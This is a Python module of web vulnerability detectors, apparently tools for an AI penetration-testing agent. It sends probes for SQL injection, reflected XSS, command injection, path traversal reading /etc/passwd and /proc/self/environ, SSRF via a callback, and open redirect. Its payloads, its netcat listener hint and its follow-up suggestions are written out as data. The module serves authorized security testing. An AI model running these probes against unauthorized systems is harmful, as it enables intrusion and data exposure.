"""Manual web attack detectors (pure Python, requests-based).

These tools are DETECTION tools: they send one or a few non-destructive
probes and report whether the target reflects/blocks/behaves differently.
Use them when sqlmap / nuclei are not installed, or for a quick manual
sanity check before running the heavy scanners.

All payloads are safe (no data modification, no destructive commands).
Authorized use only - targets must be in your engagement scope.
"""

import re

import requests

USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

MARKER = "hackerai_marker_7f3a"
MARKER2 = "hackerai_marker_9c2b"

_TIMEOUT = 15


def _session():
    s = requests.Session()
    s.headers["User-Agent"] = USER_AGENT
    return s


def _request(s, method, url, params, data):
    method = (method or "GET").upper()
    try:
        if method == "GET":
            return s.get(url, params=params, timeout=_TIMEOUT, verify=False)
        return s.post(url, data=data, params=params,
                      timeout=_TIMEOUT, verify=False)
    except requests.exceptions.SSLError:
        return s.get(url, params=params, timeout=_TIMEOUT, verify=False)
    except requests.exceptions.RequestException as exc:
        return exc


def _status_of(resp):
    if isinstance(resp, Exception):
        return "error: %s" % resp
    return "HTTP %d (len=%d)" % (resp.status_code, len(resp.content))


def _body(resp):
    return resp.text if isinstance(resp, requests.Response) else ""


def _line(flag, msg):
    return ("  [%s] %s" % ("VULN" if flag else "ok", msg))


def tool_sqli_test(url="", param="", method="GET", data=""):
    """Boolean-based SQL injection detection on a parameter.

    Sends a baseline request, a classic quote payload ('), and a
    tautology/OR payload; differences in response length/content signal
    possible SQL injection. Follow up with sqlmap_check for confirmation.
    """
    if not url or not param:
        return "sqli_test: url and param are required"
    s = _session()
    out = ["SQLi boolean-based probe: %s ? %s" % (url, param), ""]
    try:
        r0 = _request(s, method, url, {param: "1"}, data)
        out.append("baseline        : %s" % _status_of(r0))
        out.append("")

        rq = _request(s, method, url, {param: "1'"}, data)
        out.append("quote   ('')    : %s" % _status_of(rq))
        q = _body(rq)
        sqlerr = bool(re.search(
            r"sql syntax|mysql_fetch|ORA-|PostgreSQL|SQLite|JDBC|ODBC|"
            r"you have an error|Warning.*sql|Unclosed quotation|"
            r"Microsoft OLE DB", q, re.I))
        diff_quote = isinstance(r0, requests.Response) and isinstance(rq, requests.Response) \
            and len(r0.content) != len(rq.content)
        out.append(_line(sqlerr or diff_quote,
                         "quote payload differs / SQL error in response"))

        rt = _request(s, method, url, {param: "1' OR '1'='1"}, data)
        out.append("tautology       : %s" % _status_of(rt))
        taut = isinstance(r0, requests.Response) and isinstance(rt, requests.Response) \
            and len(rt.content) != len(r0.content)
        out.append(_line(taut, "OR-tautology response differs from baseline"))

        verdict = sqlerr or diff_quote or taut
        out.append("")
        out.append("VERDICT: %s"
                   % ("POSSIBLE SQLi - run sqlmap_check for confirmation"
                      if verdict else
                      "No obvious boolean-based SQLi signal on this parameter"))
        return "\n".join(out)
    except Exception as exc:
        return "sqli_test error: %s" % exc


def tool_xss_test(url="", param="", method="GET", data=""):
    """Reflected XSS detection on a parameter.

    Sends a unique marker string and a <script> tag; if the marker is
    reflected unencoded in the response, the parameter is a candidate
    for stored/reflected XSS.
    """
    if not url or not param:
        return "xss_test: url and param are required"
    s = _session()
    out = ["Reflected XSS probe: %s ? %s" % (url, param), ""]
    payload_marker = "zxcv%s" % MARKER
    payload_script = "<script>alert('%s')</script>" % MARKER
    try:
        r1 = _request(s, method, url, {param: payload_marker}, data)
        out.append("marker probe    : %s" % _status_of(r1))
        body1 = _body(r1)
        reflected = MARKER in body1
        out.append(_line(reflected, "marker %s reflected in response"
                         % ("IS" if reflected else "NOT")))

        r2 = _request(s, method, url, {param: payload_script}, data)
        out.append("script probe    : %s" % _status_of(r2))
        body2 = _body(r2)
        raw_script = "<script>alert('" + MARKER + "')</script>"
        unencoded = raw_script in body2 or MARKER in body2
        out.append(_line(unencoded and reflected,
                         "script tag reflected UNENCODED (XSS candidate)"))

        if unencoded and reflected:
            out.append("")
            out.append("VERDICT: REFLECTED XSS candidate - craft a browser-"
                       "executable payload and confirm in a real browser")
        else:
            out.append("")
            out.append("VERDICT: no obvious reflected XSS on this parameter "
                       "(marker may still appear encoded - inspect manually)")
        return "\n".join(out)
    except Exception as exc:
        return "xss_test error: %s" % exc


def tool_cmd_inject_test(url="", param="", method="GET", data=""):
    """Command injection detection on a parameter (non-destructive).

    Uses timing-free echo probes: 'echo MARKER' variants with shell
    metacharacters. If the marker appears in the response, command
    execution is likely.
    """
    if not url or not param:
        return "cmd_inject_test: url and param are required"
    s = _session()
    out = ["Command injection probe: %s ? %s" % (url, param), ""]
    payloads = [
        ("semicolon", "1; echo %s" % MARKER),
        ("ampersand", "1 & echo %s" % MARKER),
        ("pipe", "1 | echo %s" % MARKER),
        ("subshell", "1 $(echo %s)" % MARKER),
        ("backtick", "1 `echo %s`" % MARKER),
        ("newline", "1\n echo %s" % MARKER),
    ]
    hits = []
    for label, payload in payloads:
        r = _request(s, method, url, {param: payload}, data)
        out.append("%-10s : %s" % (label, _status_of(r)))
        if isinstance(r, requests.Response) and MARKER in r.text:
            hits.append(label)
            out.append(_line(True, "marker executed: %s" % label))
    out.append("")
    if hits:
        out.append("VERDICT: COMMAND EXECUTION CANDIDATE (%s) - "
                   "confirm with a benign command (id/whoami) and log the finding"
                   % ", ".join(hits))
    else:
        out.append("VERDICT: no marker execution detected (parameter may be "
                   "filtered/sanitized - try encoded variants manually)")
    return "\n".join(out)


def tool_path_traversal_test(url="", param="", method="GET", data=""):
    """Path traversal / LFI detection on a parameter.

    Probes with ../../etc/passwd (Linux) and ..\\windows\\win.ini (Windows)
    variants; flags known file signatures in the response.
    """
    if not url or not param:
        return "path_traversal_test: url and param are required"
    s = _session()
    out = ["Path traversal probe: %s ? %s" % (url, param), ""]
    payloads = [
        ("unix", "../../../../etc/passwd"),
        ("unix-enc", "..%%2f..%%2f..%%2f..%%2fetc%%2fpasswd"),
        ("win", "..\\..\\..\\windows\\win.ini"),
        ("win-enc", "..%%5c..%%5c..%%5cwindows%%5cwin.ini"),
        ("proc", "../../../../proc/self/environ"),
    ]
    hits = []
    for label, payload in payloads:
        r = _request(s, method, url, {param: payload}, data)
        out.append("%-9s : %s" % (label, _status_of(r)))
        if isinstance(r, requests.Response):
            low = r.text[:4000].lower()
            if "root:x:0:0" in low or "daemon:" in low:
                hits.append(label + " (/etc/passwd)")
                out.append(_line(True, "UNIX passwd signature found"))
            elif "[fonts]" in low or "for 16-bit app support" in low:
                hits.append(label + " (win.ini)")
                out.append(_line(True, "Windows win.ini signature found"))
            elif "user-agent" in low and "http_" in low:
                hits.append(label + " (/proc environ)")
                out.append(_line(True, "process environ signature found"))
    out.append("")
    if hits:
        out.append("VERDICT: PATH TRAVERSAL / LFI CONFIRMED (%s)" % ", ".join(hits))
    else:
        out.append("VERDICT: no file-read signatures detected (server may "
                   "block ../ - try double-encoding / absolute paths manually)")
    return "\n".join(out)


def tool_ssrf_test(url="", param="", callback_url=""):
    """SSRF detection using an external callback (collaborator-style).

    Provide a callback_url you control (e.g. your listener / Burp
    Collaborator / webhook.site). The probe requests
    http://<callback>/<marker> via the parameter; if you receive the
    hit, the server is fetching attacker-controlled URLs.
    """
    if not url or not param:
        return "ssrf_test: url and param are required"
    if not callback_url:
        return ("ssrf_test: callback_url is required - use a listener you "
                "control (nc -lvnp 80, webhook.site, interactsh-client)")
    cb = (callback_url or "").strip().rstrip("/")
    probe = "%s/%s" % (cb, MARKER)
    s = _session()
    out = ["SSRF probe: %s ? %s -> %s" % (url, param, probe), ""]
    try:
        r = _request(s, "GET", url, {param: probe}, "")
        out.append("probe response  : %s" % _status_of(r))
        out.append("")
        out.append("Check your callback listener for a hit from the target "
                   "server (path /%s)." % MARKER)
        out.append("VERDICT: if you receive a callback -> SSRF CONFIRMED. "
                   "Try file:// and internal IP schemes next, then log the finding.")
        return "\n".join(out)
    except Exception as exc:
        return "ssrf_test error: %s" % exc


def tool_open_redirect_test(url="", param=""):
    """Open redirect detection on a parameter.

    Sends external and internal redirect targets and reports which ones
    the server follows (Location header).
    """
    if not url or not param:
        return "open_redirect_test: url and param are required"
    s = _session()
    out = ["Open redirect probe: %s ? %s" % (url, param), ""]
    targets = [
        ("external", "https://example.com"),
        ("external-ssl", "//example.com"),
        ("external-enc", "https://example.com/%2f%2f"),
        ("internal", "/admin"),
    ]
    hits = []
    for label, t in targets:
        try:
            r = s.get(url, params={param: t}, timeout=_TIMEOUT, verify=False,
                      allow_redirects=False)
            loc = r.headers.get("Location", "")
            out.append("%-12s : %s -> Location: %s" % (label, r.status_code, loc or "(none)"))
            if "example.com" in loc:
                hits.append(label)
                out.append(_line(True, "redirects to external host"))
        except requests.exceptions.RequestException as exc:
            out.append("%-12s : error: %s" % (label, exc))
    out.append("")
    if hits:
        out.append("VERDICT: OPEN REDIRECT CONFIRMED (%s) - usable in "
                   "phishing chains; log the finding" % ", ".join(hits))
    else:
        out.append("VERDICT: no obvious open redirect on this parameter")
    return "\n".join(out)
